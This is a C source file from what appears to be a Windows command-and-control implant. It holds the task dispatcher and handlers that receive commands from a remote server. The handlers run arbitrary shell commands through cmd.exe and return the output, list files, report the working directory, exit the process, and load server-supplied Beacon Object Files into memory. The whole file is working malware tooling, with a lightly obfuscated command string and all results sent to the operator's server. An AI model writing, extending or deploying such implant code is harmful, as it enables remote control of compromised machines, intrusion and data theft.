#include <windows.h>
#include <Native.h>
#include <Agent.h>
#include <Defines.h>
#include <Internals.h>
#include <Bof.h>

// Send a taks result back to C2
// task_uuid: the 36-byte UUID from the inbound taks (tells server which task this answers)
// data / len: output bytes to send (can be nullptr if no output)

static void Task_SendResult( PCHAR task_uuid, PVOID data, UINT32 len )
{
    G_AGENT;

    PPACKAGE pkg = Pkg_Create( Self->Config.AgentUUID );
    if ( !pkg  ) return;

    pkg->TaskUUID = task_uuid;

    // write the task UUID into the packet so the server can match it
    Pkg_Pad( pkg, task_uuid, 36 );

    if ( data && len > 0 )
    {
        Pkg_Bytes( pkg, data, len );
    }

    PVOID resp = nullptr;
    UINT32 resp_size = 0;
    Pkg_Transmit( pkg, &resp, &resp_size );
    Pkg_Destroy( pkg );
}

// command handlers

// Exit - terminate the current process immediately
static void Task_Exit( PCHAR task_uuid, PPARSER args )
{
    G_AGENT;
    Task_SendResult( task_uuid, nullptr, 0 );
    Self->Ntdll.NtAllocateVirtualMemory( (HANDLE)-1, nullptr, 0, nullptr, 0, 0 );
    // use NtTerminateProcess via direct syscall stub - for now call via kernel32
    // kernel32!TerminateProcess wraps NtTerminateProcess
    Self->Krnl32.TerminateProcess( (HANDLE)-1, 0 );
}

// PWD - Return the current working directory
static void Task_Pwd( PCHAR task_uuid, PPARSER args )
{
    G_AGENT;

    CHAR buf[512];
    Mem_Set( buf, 0, sizeof(buf) );
    DWORD len = Self->Krnl32.GetCurrentDirectoryA( sizeof(buf), buf );

    Task_SendResult( task_uuid, buf, len );
}

// Shell - run a command via cmd.exe /c, capture stdout+stderr, send output
static void Task_Shell( PCHAR task_uuid, PPARSER args )
{
    G_AGENT;

    // read the command string from the args parser
    UINT32 cmd_len = 0;
    PCHAR cmd_str = Psr_Str( args, &cmd_len );
    if ( !cmd_str || cmd_len == 0 ) return;

    // build "cmd.exe /c <command>" on the stack
    // max command length we support
    CHAR cmdline[1024];
    Mem_Set( cmdline, 0, sizeof(cmdline) );

    CHAR prefix[] = { 'c','m','d','.','e','x','e',' ','/','c',' ',0 };
    UINT32 i = 0;
    while ( prefix[i] )
    {
        cmdline[i] = prefix[i];
        i++;
    }
    UINT32 j = 0;
    while ( j < cmd_len && i < sizeof(cmdline) - 1 )
    {
        cmdline[i++] = cmd_str[j++];
    }

    //create a pipe for stdout/stderr
    HANDLE h_read = nullptr;
    HANDLE h_write = nullptr;

    SECURITY_ATTRIBUTES sa;
    Mem_Set( &sa, 0, sizeof(sa) );
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    if ( !Self->Krnl32.CreatePipe( &h_read, &h_write, &sa, 0 ) ) return;

    STARTUPINFOA si;
    Mem_Set( &si, 0, sizeof(si) );
    si.cb           = sizeof(si);
    si.dwFlags      = STARTF_USESTDHANDLES;
    si.hStdOutput   = h_write;
    si.hStdError    = h_write;
    si.hStdInput    = nullptr;

    PROCESS_INFORMATION pi;
    Mem_Set( &pi, 0, sizeof(pi) );

    BOOL ok = Self->Krnl32.CreateProcessA(
        nullptr,    // no explicit exe path - cmd.exe is in the cmdline
        cmdline,
        nullptr,    // default process security
        nullptr,    // default thread secruity
        TRUE,
        0,
        nullptr,
        nullptr,
        &si,
        &pi
    );

    // Close the write end in our process - the child own it now
    // if we keep it open, ReadFile belwo will never get EOF
    Self->Krnl32.CloseHandle( h_write );

    if ( !ok )
    {
        Self->Krnl32.CloseHandle( h_read );
        return;
    }

    // Wait for the process to finish
    Self->Krnl32.WaitForSingleObject( pi.hProcess, 30000 ); // 30s timeout

    // read all output from the pipe
    UINT32 total = 0;
    UINT32 cap = 4096;
    PBYTE buf = (PBYTE)Heap_Alloc( cap );

    if ( buf )
    {
        DWORD chunk = 0;
        do
        {
            if ( total + 4096 > cap )
            {
                cap += 4096;
                buf = (PBYTE)Heap_Realloc( buf, cap );
                if ( !buf ) break;
            }
            chunk = 0;
            Self->Krnl32.ReadFile( h_read, buf + total, 4096, &chunk, nullptr );
            total += chunk;
        } while ( chunk > 0 );

        Task_SendResult( task_uuid, buf, total );
        Heap_Free( buf );
    }

    Self->Krnl32.CloseHandle( h_read );
    Self->Krnl32.CloseHandle( pi.hProcess );
    Self->Krnl32.CloseHandle( pi.hThread );
}

// Ls - list files in a directory (or current dir if no arg)
static void Task_Ls( PCHAR task_uuid, PPARSER args )
{
    G_AGENT;

    // read optional path argument
    UINT32 path_len = 0;
    PCHAR  path_str = Psr_Str( args, &path_len );

    // build the search pattern: "<path>\*" or ".\*"
    CHAR pattern[512];
    Mem_Set( pattern, 0, sizeof(pattern) );

    if ( path_str && path_len > 0 ) {
        UINT32 i = 0;
        while ( i < path_len && i < sizeof(pattern) - 3 ) { pattern[i] = path_str[i]; i++; }
        pattern[i++] = '\\';
        pattern[i++] = '*';
    } else {
        pattern[0] = '.'; pattern[1] = '\\'; pattern[2] = '*';
    }

    // output buffer - grows as we find entries
    UINT32 out_cap = 4096;
    UINT32 out_len = 0;
    PCHAR  out_buf = (PCHAR)Heap_Alloc( out_cap );
    if ( !out_buf ) return;

    WIN32_FIND_DATAA fd;
    Mem_Set( &fd, 0, sizeof(fd) );

    HANDLE h = Self->Krnl32.FindFirstFileA( pattern, &fd );
    if ( h == INVALID_HANDLE_VALUE ) {
        Task_SendResult( task_uuid, out_buf, 0 );
        Heap_Free( out_buf );
        return;
    }

    do {
        // format one line: "<name>\t<size>\n"
        CHAR line[300];
        Mem_Set( line, 0, sizeof(line) );

        // copy filename
        UINT32 li = 0;
        UINT32 ni = 0;
        while ( fd.cFileName[ni] && li < sizeof(line) - 20 ) line[li++] = fd.cFileName[ni++];

        line[li++] = '\t';

        // file size as decimal (directories show 0)
        UINT32 size = fd.nFileSizeLow;
        if ( fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) {
            line[li++] = '<'; line[li++] = 'd'; line[li++] = 'i'; line[li++] = 'r'; line[li++] = '>';
        } else {
            // write size digits
            CHAR digits[12];
            Mem_Set( digits, 0, sizeof(digits) );
            INT32 di = 10;
            if ( size == 0 ) { digits[10] = '0'; di = 10; }
            else {
                UINT32 tmp = size;
                while ( tmp > 0 ) { digits[di--] = '0' + (tmp % 10); tmp /= 10; }
                di++;
            }
            while ( di <= 10 ) line[li++] = digits[di++];
        }

        line[li++] = '\n';

        // grow output buffer if needed
        if ( out_len + li + 1 > out_cap ) {
            out_cap += 4096;
            out_buf  = (PCHAR)Heap_Realloc( out_buf, out_cap );
            if ( !out_buf ) break;
        }

        Mem_Copy( out_buf + out_len, line, li );
        out_len += li;

    } while ( Self->Krnl32.FindNextFileA( h, &fd ) );

    Self->Krnl32.FindClose( h );
    Task_SendResult( task_uuid, out_buf, out_len );
    Heap_Free( out_buf );
}

// BOF Execute - laod a COFF .o file, run go(), send output back
static void Task_Bof( PCHAR task_uuid, PPARSER args )
{
    G_AGENT;

    // first arg: the raw .o file bytes
    UINT32 bof_size = 0;
    PBYTE bof_data = Psr_Bytes( args, &bof_size );
    if ( !bof_data || bof_size == 0 ) return;

    // second arg: packed arguments for the BOF (may be empty)
    UINT32 arg_size = 0;
    PBYTE arg_data = Psr_Bytes( args, & arg_size );

    // zero the output accumulator before running
    Self->Bof.OutputBuf = nullptr;
    Self->Bof.OutputLen = 0;
    Self->Bof.OutputCap = 0;

    // COM must be initialized for BOFs that use CLR (execute-assembly) or OLEAUT32.
    // CoInitializeEx returns S_FALSE if already initialized - safe to call every time.
    typedef HRESULT (WINAPI *fnCoInitializeEx)(LPVOID, DWORD);
    PVOID hOle32 = (PVOID)Self->Krnl32.LoadLibraryA( (PCHAR)"ole32.dll" );
    if ( hOle32 ) {
        auto CoInitEx = (fnCoInitializeEx)Self->Krnl32.GetProcAddress( (HMODULE)hOle32, (PCHAR)"CoInitializeEx" );
        if ( CoInitEx ) CoInitEx( nullptr, 0x0 ); // COINIT_MULTITHREADED
    }

    // run the BOF
    Bof_Loader( bof_data, bof_size, arg_data, arg_size );

    // send whatever the BOF printed via BeaconOutput/BeaconPrintf
    Task_SendResult( task_uuid, Self->Bof.OutputBuf, Self->Bof.OutputLen );

    // free the output buffer
    if ( Self->Bof.OutputBuf ) Heap_Free( Self->Bof.OutputBuf );
    Self->Bof.OutputBuf = nullptr;
    Self->Bof.OutputLen = 0;
    Self->Bof.OutputCap = 0;

}

// Dispatcher

// Parse the server's poll response and dispatch each task to its handler
// Wire format: [int32 count] then for each task: [36-byte UUID][int32 cmdID][bytes args]
DECLFN BOOL Task_Dispatch( PVOID buf, UINT32 buf_len )
{
    if ( !buf || buf_len < 4 ) return FALSE;

    PARSER psr;
    Mem_Set( &psr, 0, sizeof(psr) );
    Psr_New( &psr, buf, buf_len );

    INT32 count = Psr_Int32( &psr );
    if ( count <= 0 ) { Psr_Destroy( &psr ); return TRUE; }

    for ( INT32 i = 0; i < count; i++ )
    {
        // read 36-byte task UUID (raw, no length prefix)
        if ( psr.Length < 36 ) break;
        PCHAR task_uuid = psr.Buffer;
        Psr_Pad( &psr, 36 );

        // command ID
        INT32 cmd_id = Psr_Int32( &psr );

        // argument blob - length-prefixed bytes
        UINT32 arg_size = 0;
        PBYTE  arg_data = Psr_Bytes( &psr, &arg_size );

        // build a sub-parser over just the argument bytes
        PARSER args;
        Mem_Set( &args, 0, sizeof(args) );
        if ( arg_data && arg_size > 0 )
            Psr_New( &args, arg_data, arg_size );

        switch ( cmd_id )
        {
            case CMD_EXIT:   Task_Exit ( task_uuid, &args ); break;
            case CMD_SHELL:  Task_Shell( task_uuid, &args ); break;
            case CMD_PWD:    Task_Pwd  ( task_uuid, &args ); break;
            case CMD_LS:     Task_Ls   ( task_uuid, &args ); break;
            case CMD_BOF:    Task_Bof  ( task_uuid, &args ); break;
            default: break;
        }

        if ( arg_data && arg_size > 0 )
            Psr_Destroy( &args );
    }

    Psr_Destroy( &psr );
    return TRUE;
}
















